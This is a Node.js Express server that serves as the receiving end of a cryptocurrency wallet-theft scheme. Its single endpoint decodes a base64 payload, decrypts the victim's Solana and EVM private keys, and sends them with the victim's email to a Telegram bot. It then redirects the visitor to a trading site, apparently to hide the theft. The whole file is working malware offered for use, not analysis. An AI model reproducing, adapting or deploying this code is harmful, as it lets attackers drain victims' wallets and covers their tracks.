const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const app = express();

const TG_BOT = 'YOUR_BOT_TOKEN';
const TG_CHAT = 'YOUR_CHAT_ID';

function decrypt(encrypted, bundleKey) {
  try {
    const [ivBase64, ciphertext] = encrypted.split(':');
    if (!ivBase64 || !ciphertext) {
      return 'INVALID_FORMAT';
    }
    
    const iv = Buffer.from(ivBase64, 'base64');
    const key = Buffer.from(bundleKey, 'base64');
    
    // Pad IV to 16 bytes if needed
    let paddedIV = iv;
    if (iv.length < 16) {
      paddedIV = Buffer.alloc(16);
      iv.copy(paddedIV);
    }
    
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, paddedIV);
    let decrypted = decipher.update(ciphertext, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (e) {
    return 'DECRYPT_ERROR: ' + e.message;
  }
}

app.get('/data/:b64', async (req, res) => {
  try {
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    let sBundles = data.sBundles;
    let eBundles = data.eBundles;
    
    if (typeof sBundles === 'string') sBundles = JSON.parse(sBundles);
    if (typeof eBundles === 'string') eBundles = JSON.parse(eBundles);
    
    const solKeys = sBundles?.map(enc => decrypt(enc, data.bundle)) || [];
    const evmKeys = eBundles?.map(enc => decrypt(enc, data.bundle)) || [];
    
    const msg = `
🚨 DECRYPTED KEYS

Email: ${data.user?.email || 'N/A'}

Solana Private Keys:
${solKeys.join('\n')}

EVM Private Keys:
${evmKeys.join('\n')}
    `;
    
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
    });
    
    res.redirect('https://axiom.trade/discover');
  } catch (e) {
    console.error(e);
    res.status(500).send('err');
  }
});

app.listen(process.env.PORT || 3000);
